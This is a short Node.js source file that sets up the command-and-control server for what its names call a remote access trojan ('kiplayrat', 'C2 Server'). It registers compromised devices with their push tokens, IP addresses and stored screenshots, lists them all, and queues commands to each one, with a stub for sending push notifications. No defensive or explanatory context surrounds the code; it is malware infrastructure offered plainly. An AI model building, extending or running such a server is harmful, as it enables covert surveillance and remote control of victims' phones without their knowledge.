const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

// MongoDB Schema
const DeviceSchema = new mongoose.Schema({
  deviceId: String,
  fcmToken: String,
  model: String,
  brand: String,
  ip: String,
  online: Boolean,
  screenshots: [String],
  commands: []
});

const Device = mongoose.model('Device', DeviceSchema);

app.post('/api/register', async (req, res) => {
  const device = new Device(req.body);
  await device.save();
  res.json({success: true});
});

app.get('/api/devices', async (req, res) => {
  const devices = await Device.find();
  res.json(devices);
});

app.post('/api/command/:deviceId', async (req, res) => {
  const device = await Device.findOne({deviceId: req.params.deviceId});
  device.commands.push(req.body.command);
  await device.save();
  // Send FCM push notification
  res.json({success: true});
});

mongoose.connect('mongodb://localhost/kiplayrat').then(() => {
  app.listen(3000, () => console.log('🚀 C2 Server running on port 3000'));
});
